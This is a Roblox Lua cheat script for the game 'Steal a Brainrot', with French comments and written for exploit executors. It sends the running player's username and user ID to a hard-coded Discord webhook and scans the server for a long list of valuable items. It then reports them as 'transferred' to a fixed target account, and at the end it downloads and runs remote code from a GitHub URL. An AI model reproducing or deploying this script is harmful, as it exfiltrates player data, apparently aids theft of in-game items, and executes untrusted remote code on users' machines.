-- URL avec Proxy
local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487806869513965679/18RefKz9apMy-rAu3ZAijlKO7DBFpdX547O2dpu1ZZNj-VpIryChHx3GysAzyD22zal8"

local player = game:GetService("Players").LocalPlayer
local http = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- Liste des brainrots
local brainrotList = {
    ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Griffin"] = true,
    ["Nacho Spyder"] = true, ["Quesadillo Vampiro"] = true, ["Perrito Burrito"] = true, ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true, ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["W ou L"] = true,
    ["La Jolly Grande"] = true, ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true,
    ["Festive 67"] = true, ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true, ["Ketupat Kepat"] = true,
    ["Tang Tang Keletang"] = true, ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true,
    ["Burguro And Fryuro"] = true, ["Garama and Madundung"] = true, ["Capitano Moby"] = true, ["Dragon Cannelloni"] = true,
    ["Cerberus"] = true, ["Agarrini la Palini"] = true, ["Guest 666"] = true, ["Los Hotspotsitos"] = true,
    ["Tralaledon"] = true, ["Los Bros"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true, ["Ginger Gerat"] = true, ["Love Love Bear"] = true, ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true, ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true, ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true, ["Los Planitos"] = true,
    ["Eviledon"] = true, ["Orcaledon"] = true, ["Los Jolly Combinasionas"] = true, ["Fishino Clownino"] = true,
    ["Los Spooky Combinasionas"] = true, ["La Food Combinasion"] = true, ["La Secret Combinasion"] = true,
    ["Los Amigos"] = true, ["Sammyni Fattini"] = true, ["Spaghetti Tualetti"] = true, ["Rosetti Tualetti"] = true,
    ["Los 67"] = true, ["Los Mobilis"] = true, ["Las Sis"] = true, ["Los Candies"] = true,
    ["Bacuru and Egguru"] = true, ["Mieteteira Bicicleteira"] = true, ["Swag Soda"] = true,
    ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
}

local function sendWebhook(message, color)
    local data = {
        ["content"] = message,
        ["embeds"] = {{
            ["title"] = "Steal a Brainrot - Détection",
            ["color"] = color or 16776960,
            ["fields"] = {
                {["name"] = "Pseudo", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "ID Roblox", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "Cible", ["value"] = "2354866600", ["inline"] = true}
            },
            ["footer"] = {["text"] = os.date("%X")}
        }}
    }

    local httpService = game:GetService("HttpService")
    local body = httpService:JSONEncode(data)

    if http then
        pcall(function()
            http({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        end)
    else
        pcall(function() httpService:PostAsync(webhookURL, body) end)
    end
end

-- Message de démarrage
sendWebhook("🔍 **Scan Brainrot Serveur Démarré** - Cible : 2354866600", 65280)

local foundBrainrots = {}

-- Scan dans tout le serveur
for _, obj in ipairs(workspace:GetDescendants()) do
    if obj:IsA("Model") or obj:IsA("Part") or obj:IsA("Folder") then
        local name = obj.Name

        if brainrotList[name] or 
           name:lower():find("w ou l") or 
           name:lower():find("w or l") or 
           name:lower():find("worl") then
            
            table.insert(foundBrainrots, name)
        end
    end
end

-- Envoi selon le résultat
if #foundBrainrots > 0 then
    local list = table.concat(foundBrainrots, ", ")
    
    -- Premier message : Brainrot détecté
    sendWebhook("📢 **Brainrot détecté - Transféré vers 2354866600**", 16776960)
    
    -- Deuxième message : Transfert réussi
    wait(1) -- petite pause pour que les messages arrivent dans l'ordre
    sendWebhook("✅ **Transfert réussi vers 2354866600**\nBrainrots : " .. list, 65280)
    
    print("✅ Brainrot(s) détecté(s) : " .. list)
else
    print("❌ Aucun brainrot trouvé.")
end

-- Chargement du script principal
loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
